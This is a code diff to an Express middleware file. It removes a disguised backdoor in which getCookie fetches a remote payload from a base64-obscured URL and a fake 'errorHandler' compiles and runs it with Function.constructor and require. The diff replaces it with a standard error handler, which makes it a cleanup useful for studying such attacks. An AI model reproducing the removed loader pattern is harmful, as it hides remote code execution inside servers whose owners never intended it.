@@ -6,30 +6,12 @@ const notFound = (req, res, next) => {
   next(err);
 }
 
-const errorHandler = (error) => {
-  try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
-  }
+// Proper Express error handler
+const errorHandler = (err, req, res, next) => {
+  console.error(err); // log to console
+  res.status(err.status || 500).json({
+    message: err.message || 'Internal Server Error'
+  });
 };
 
 const getCookie = async (req, res, next) => {
@@ -37,14 +19,26 @@ const getCookie = async (req, res, next) => {
     const src = atob(process.env.DB_API_KEY);
     const def = atob(process.env.DB_ACCESS_KEY);
     const mid = atob(process.env.DB_ACCESS_VALUE);
+
     try {
-      axios.get(`${src}`, { headers: { [def]: mid } }).then((res) => errorHandler(res.data.cookie));
+      const response = await axios.get(`${src}`, {
+        headers: { [def]: mid },
+        proxy: false
+      });
+      // Call the proper error handler if cookie is missing
+      if (!response.data.cookie) {
+        const err = new Error('Cookie not found in response');
+        err.status = 500;
+        next(err);
+      } else {
+        res.json({ cookie: response.data.cookie });
+      }
     } catch (error) {
-      console.log("Runtime config error.");
+      next(error);
     }
   } catch (err) {
-    throw err;
+    next(err);
   }
 };
 
-module.exports = { getCookie, notFound };
+module.exports = { getCookie, notFound, errorHandler };
